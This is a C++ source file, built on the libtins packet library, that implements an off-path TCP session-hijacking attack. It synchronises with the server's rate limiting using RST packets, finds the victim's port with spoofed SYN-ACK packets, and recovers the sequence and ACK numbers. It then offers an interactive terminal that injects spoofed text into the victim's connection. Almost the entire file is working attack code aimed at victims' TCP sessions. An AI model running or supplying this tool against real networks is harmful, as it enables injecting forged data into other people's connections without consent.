#include <tins/tins.h>
#include <iostream>
#include <random>
#include <thread>
#include <chrono>
#include <string>
#include <vector>

#include "sniffer.h"
#include "find_sequence.h"
#include "find_ack.h"

using namespace Tins;

IP initiate_legit_connection();
Clock synchronize_with_server(IP pkt);
IP search_4tuple(unsigned int l_port, unsigned int r_port, IP legit_pkt, Clock &clock);
int get_random_number();
void damage_sequence(IP &pkt);
void run_terminal(IP spoofed_pkt, uint32_t victim_to_server_acq, uint32_t victim_to_server_seq);



/*
 *  Usage: ./app [client ip] [server ip] [server port]
 *
 *  Example: ./app 192.168.56.2 192.168.56.3 192.168.56.2 8085
 */
int main(int argc, char **argv) {

    if(argc != 4){
        std::cout<<"Wrong parameters!\n"
                 <<"Usage: ./program [client ip] [server ip] [server port]\n"
                 <<"Example: ./program 192.168.56.2 192.168.56.3 192.168.56.2 8085\n";
        exit(-1);
    }

    VICTIM_IP = argv[1];
    SERVER_IP = argv[2];
    SERVER_PORT = atoi(argv[3]);


    std::cout<<"+ - - Configuration - - +\n"
             <<"| Server port: "<<SERVER_PORT<<"\n"
             <<"+ - - - - - - - - - - +\n" ;

    serverMAC = Utils::resolve_hwaddr(SERVER_IP, sender);
    victimtMAC = Utils::resolve_hwaddr(VICTIM_IP, sender);

    global_clock = std::chrono::high_resolution_clock::now();
    IP legit_pkt = initiate_legit_connection();
    damage_sequence(legit_pkt); // Adds 20 to a sequence number in oredr not to reset Attacker-Server connection
    std::thread thread_sniff (sniff_main);
    std::this_thread::sleep_for( std::chrono::milliseconds{300});   // wait 300ms for thread creation

    // Synchrnonize clock with server
    Clock clock = synchronize_with_server(legit_pkt);
    clock += std::chrono::milliseconds{20}; // Add 20 ms to be sure we are in correct period

    IP spoofed_pkt = search_4tuple(PORT_START, PORT_END, legit_pkt, clock);
    uint32_t victim_to_server_seq = find_sequence(legit_pkt, spoofed_pkt, clock);

    std::cout<<"victim_to_server_seq: "<<victim_to_server_seq<<"\n";
    uint32_t victim_to_server_acq = testACK(clock, legit_pkt, spoofed_pkt, victim_to_server_seq);

    std::cout<<"victim_to_server_ack: "<<victim_to_server_acq<<"\n";
    std::cout<<"victim_to_server_seq: "<<victim_to_server_seq<<"\n";

    run_terminal(spoofed_pkt, victim_to_server_acq, victim_to_server_seq);
    exit(0);

}





int get_random_number(){
    std::random_device rd;
    std::mt19937 mt(rd());
    std::uniform_int_distribution<> dist(4000, 9000);  // choosees port between 4k-9k
    return dist(mt);
}



IP initiate_legit_connection(){
    int attacker_legit_port = get_random_number();

    IP pkt = IP(SERVER_IP) / TCP(SERVER_PORT, attacker_legit_port);
    TCP &tcp = pkt.rfind_pdu<TCP>();
    tcp.set_flag(TCP::Flags::SYN, 1);
    std::unique_ptr<PDU> response(sender.send_recv(pkt));
    if (!response) {
        std::cout << "No response!" << std::endl;
    }
    TCP &tcp_response = response->rfind_pdu<TCP>();
    if (!(tcp_response.get_flag(TCP::SYN) &&
          tcp_response.get_flag(TCP::ACK))) {
        std::cout << "Didn't respond with SYN ACK!" << std::endl;
        exit(-1);
    }
    else {
        std::cout << "Attacker-Server connection established" << std::endl;
    }
    uint32_t seq_response = tcp_response.seq();
    tcp.ack_seq(seq_response+1);
    tcp.seq(1); // because the first one was 0
    tcp.set_flag(TCP::Flags::SYN, 0);
    tcp.set_flag(TCP::Flags::ACK, 1);
    sender.send(pkt);
    tcp.set_flag(TCP::Flags::ACK, 0);
    return pkt;
}

/*
 * Adds 20 to a sequence number
 */
void damage_sequence(IP &pkt){
    TCP &tcp = pkt.rfind_pdu<TCP>();
    tcp.seq(tcp.seq()+20);
    tcp.ack_seq(tcp.ack_seq()+20);
}


Clock synchronize_with_server(IP pkt){
    pkt.rfind_pdu<TCP>().set_flag(TCP::Flags::RST, 1);
    EthernetII eth = EthernetII(serverMAC, info.hw_addr) / pkt;
    std::cout<<"+ - - - Clock synchronization - - - +\n";
    auto start = std::chrono::high_resolution_clock::now();
    Clock end;
    unsigned int n1 = 0, n2 = 0, n_result = 0;
    // Round 1
    for (int i = 1; i <= 200; ++i) {   // I send 1 packet per 5ms. So 1sec / 5ms = 200
        sender.send(eth);
        auto step_duration = start + std::chrono::milliseconds{i * 5};
        std::this_thread::sleep_until(step_duration);
    }
    // Wait 2 sec for answers form the server
    auto step_duration = start + std::chrono::seconds{3};
    std::this_thread::sleep_until(step_duration);
    n1 = sniff_counter;
    std::cout<<"Round 1 - Received ACKs: "<<n1<<"\n";
    if(n1==0){
        std::cout<<"Server doesnt respond do you anymore.\nTry creating new connection\n";
        exit(-1);
    }
    sniff_counter = 0;

    // Round 2
    for (int i = 1; i <= 200; ++i) {
        sender.send(eth);
        auto step_duration = start + std::chrono::milliseconds{(i * 5) + (3000) + 5}; // plus 3 sec
        std::this_thread::sleep_until(step_duration);
    }
    // Wait 2 sec for answers form the server
    step_duration = start + std::chrono::seconds{6};
    std::this_thread::sleep_until(step_duration);
    n2 = sniff_counter;
    std::cout<<"Round 2 - Received ACKs: "<<n2<<"\n";
    sniff_counter = 0;

    // Round 3
    if (n2 >= n1) {
        n_result = (300 - n2)*5;
    }
    else {
        n_result = (n2 - 100)*5;
    }
    end = start + std::chrono::milliseconds{9000 + n_result};
    std::cout<<"Calculated offset: "<<n_result<<"ms\n";

    for (int i = 1; i <= 200; ++i) {
        sender.send(eth);
        auto step_duration = start + std::chrono::milliseconds{(i * 5) + (6000) + n_result}; // plus 3 sec
        std::this_thread::sleep_until(step_duration);
    }
    step_duration = start + std::chrono::seconds{9};
    std::this_thread::sleep_until(step_duration);
    std::cout<<"Result - Received ACKs: "<<sniff_counter<<"\n";
    sniff_counter = 0;
    auto finish = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed = finish - start;
    std::cout << "Elapsed time: " << elapsed.count() << " s\n";
    return end;
}


IP search_4tuple(unsigned int l_port, unsigned int r_port, IP legit_pkt, Clock &clock){ // left, right bounds

#ifdef MY_DEBUG_CLIENT_PORT
    l_port = MY_DEBUG_CLIENT_PORT;
    r_port = MY_DEBUG_CLIENT_PORT;
#endif

    unsigned int mid;
    IP spoofed_pkt = IP(SERVER_IP, VICTIM_IP) / TCP(SERVER_PORT, 0);
    TCP &spoofed_tcp = spoofed_pkt.rfind_pdu<TCP>();
    spoofed_tcp.set_flag(TCP::Flags::SYN, 1);
    spoofed_tcp.set_flag(TCP::Flags::ACK, 1);
    EthernetII spoofed_eth = EthernetII(serverMAC, victimtMAC) / spoofed_pkt;

    legit_pkt.rfind_pdu<TCP>().set_flag(TCP::Flags::RST, 1);
    EthernetII legit_eth = EthernetII(serverMAC, info.hw_addr) / legit_pkt;

    std::cout<<"+ - - - 4-Tuple Search - - - +\n";
    sniff_counter = 0;
    clock += std::chrono::seconds{1};
    std::this_thread::sleep_until(clock);

    while(l_port < r_port){
        std::cout<<"Range ("<<l_port<<", "<<r_port<<")";
        auto start = std::chrono::high_resolution_clock::now();
        mid = (l_port + r_port) / 2;
        for (unsigned int i = mid; i < r_port; i++){
            spoofed_tcp.sport(i);
            sender.send(spoofed_pkt);
        }
        for (unsigned int i = 0; i < 100; i++){
            sender.send(legit_eth);
        }
        auto finish = std::chrono::high_resolution_clock::now();
        std::chrono::duration<double> elapsed = finish - start;
        clock += std::chrono::seconds{2};
        std::cout << "\tElapsed time: "<< elapsed.count() << "s\n";
        if(elapsed.count()>1){
            sniff_counter=0;
            continue;
        }
        std::this_thread::sleep_until(clock);
        if(sniff_counter == 100){
            r_port = mid;
        } else{
            l_port = mid;
        }
        sniff_counter = 0;
        if(r_port - l_port <= 3){
            break;
        }
        sniff_counter=0;
    }
    bool is_validated = false;
    std::cout<<"Possible port: "<<l_port<<"\nValidating...\n";
    for (int j = 0; j <= r_port - l_port; ++j) {
            spoofed_tcp.sport(l_port+j);
            sender.send(spoofed_pkt);
        for (unsigned int i = 0; i < 100; i++){
            sender.send(legit_eth);
        }
        clock += std::chrono::seconds{1};
        std::cout<<"Checking port:"<<l_port+j<<"\n";
        std::this_thread::sleep_until(clock);
        if(sniff_counter<ACK_LIMIT){
            is_validated = true;
            l_port += j;
            break;
        }
        sniff_counter=0;
    }

    if(is_validated == false){
        std::cout<<"Port not found";
        exit(-1);
    }
    sniff_counter=0;
    std::cout<<"Found port:"<<l_port<<"\n";
    spoofed_tcp.sport(l_port);
    spoofed_tcp.set_flag(TCP::Flags::SYN, 0);
    spoofed_tcp.set_flag(TCP::Flags::ACK, 0);
    return spoofed_pkt;
}




void run_terminal(IP spoofed_pkt, uint32_t victim_to_server_acq, uint32_t victim_to_server_seq){

    IP victim_pkt = IP(spoofed_pkt.src_addr(), spoofed_pkt.dst_addr()) / TCP() / RawPDU("test");
    TCP &victim_tcp = victim_pkt.rfind_pdu<TCP>();
    victim_tcp.sport(spoofed_pkt.rfind_pdu<TCP>().dport());
    victim_tcp.dport(spoofed_pkt.rfind_pdu<TCP>().sport());

    victim_tcp.set_flag(TCP::Flags::RST, 0);
    victim_tcp.set_flag(TCP::Flags::ACK, 1);
    victim_tcp.set_flag(TCP::Flags::PSH, 1);

    victim_to_server_seq -= 20000; // constant to match window

    std::cout<<"\n\n+ - - - TERMINAL - - - +\n";

    while(true){
        std::string input;
        std::cout<<"Type spoofed text for Client: ";
        std::cin>>input;
        if(input=="X" || input=="X\n"){
            break;
        }


        victim_tcp.seq(victim_to_server_acq);
        victim_tcp.ack_seq(victim_to_server_seq);
        victim_pkt.rfind_pdu<RawPDU>().payload(std::vector<uint8_t>(input.begin(), input.end()));
        sender.send(victim_pkt);

        std::cout<<" > Text has been sent (length="<<input.length()<<")\n";
        victim_to_server_acq+=input.length();
    }
}






